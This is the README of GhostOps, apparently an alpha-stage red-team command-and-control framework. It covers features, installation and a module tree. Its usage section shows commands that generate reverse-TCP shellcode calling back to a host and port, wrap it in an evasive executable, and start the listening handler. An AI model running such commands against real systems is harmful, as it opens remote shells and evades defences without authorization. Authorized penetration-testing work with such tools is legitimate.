<p align="center">
  <img src="https://github.com/user-attachments/assets/ac868e4f-f741-46dd-935b-b9947d8679cc" alt="GhostOps Logo" width="250"/>
</p>

<h3 align="center">GhostOps - Command and Control Framework.</h3>

---

## 🚧 Alpha Phase

> **GhostOps is currently in active alpha development.**  
> Features are subject to change, and stability is not guaranteed.  
> Use in controlled environments for testing and feedback purposes only.

---

## 📖 Overview

**GhostOps** is a modular, extensible, and stealth-oriented Command & Control (C2) framework tailored for red teamers, penetration testers, and cybersecurity professionals. It enables simulation of sophisticated threat actor behavior through encrypted communication channels, payload generation, and covert command execution.

Designed with flexibility and stealth in mind, GhostOps supports multiple payload architectures, handler types, and evasion techniques — all in a clean, plugin-ready architecture.

---

## ✨ Features

- 🔒 **Secure C2 Communication** – Modular handler support including bind and reverse TCP.
- 🧬 **Payload Generation** – Cross-platform payloads for Windows and Linux (x86/x64).
- 👻 **Evasion Modules** – Techniques like direct syscalls, no-API execution, and more.
- 🧩 **Modular Design** – Clean plugin-based architecture for easy extension.
- 🛠 **Poetry-Based Dependency Management** – Simple and reproducible development setup.

---

## ⚙️ Installation

```bash
sudo apt install mingw-w64 python3 python3-pip python3-venv python3-poetry -y
git clone https://github.com/4w4647/GhostOps.git ~/GhostOps
cd ~/GhostOps
poetry install
$(poetry env activate)
ghostops --help
```

## 📂 Project Structure

```bash
.
├── ghostops
│   ├── common
│   │   └── utils.py
│   ├── core
│   │   └── base_module.py
│   ├── ghostops.py
│   └── modules
│       ├── evasion
│       │   └── no_api_exec.py
│       ├── handler
│       │   ├── bind
│       │   │   └── tcp
│       │   │       └── handler_bind_tcp.py
│       │   └── reverse
│       │       └── tcp
│       │           └── handler_reverse_tcp.py
│       └── payload
│           ├── linux
│           │   ├── x64
│           │   │   └── shell
│           │   │       ├── bind
│           │   │       │   └── tcp
│           │   │       │       └── linux_x64_shell_bind_tcp.py
│           │   │       └── reverse
│           │   │           └── tcp
│           │   │               └── linux_x64_shell_reverse_tcp.py
│           │   └── x86
│           │       └── shell
│           │           ├── bind
│           │           │   └── tcp
│           │           │       └── linux_x86_shell_bind_tcp.py
│           │           └── reverse
│           │               └── tcp
│           │                   └── linux_x86_shell_reverse_tcp.py
│           └── windows
│               ├── x64
│               │   └── shell
│               │       ├── bind
│               │       │   └── tcp
│               │       │       └── windows_x64_shell_bind_tcp.py
│               │       └── reverse
│               │           └── tcp
│               │               └── windows_x64_shell_reverse_tcp.py
│               └── x86
│                   └── shell
│                       ├── bind
│                       │   └── tcp
│                       │       └── windows_x86_shell_bind_tcp.py
│                       └── reverse
│                           └── tcp
│                               └── windows_x86_shell_reverse_tcp.py
├── LICENSE
├── poetry.lock
├── pyproject.toml
└── README.md
```

## 🧠 Usage Example

Generating Windows x64 Shell Reverse TCP shellcode.
```bash
ghostops --module WindowsX64ShellReverseTcp --host 192.168.1.1 --port 1337 --output ghostops.bin
```

Generating x64 PE (Portable Executable) that runs generated shellcode using "No Win32 API" shellcode injection technique.
```bash
ghostops --module NoApiExec --arch x64 --shellcode ghostops.bin --output ghostops.exe
```

Starting a Reverse TCP handler.
```bash
ghostops --module HandlerReverseTcp --host 192.168.1.1 --port 1337
```

## 🤝 Contributing

We welcome contributions! If you’d like to report a bug, request a feature, or submit code:

- Fork the repo
- Create a new branch
- Open a pull request
  
Please ensure your code follows existing style conventions and is properly documented.

## 📜 License

**GhostOps** is licensed under the **BSD 3-Clause License**.  
See the [LICENSE](LICENSE) file for full license text.

## ⚖️ Legal Notice

```
GhostOps is intended for educational and authorized penetration testing only.
Unauthorized access to computer systems is illegal and unethical.
Use responsibly and only in environments you own or have explicit permission to test.
```
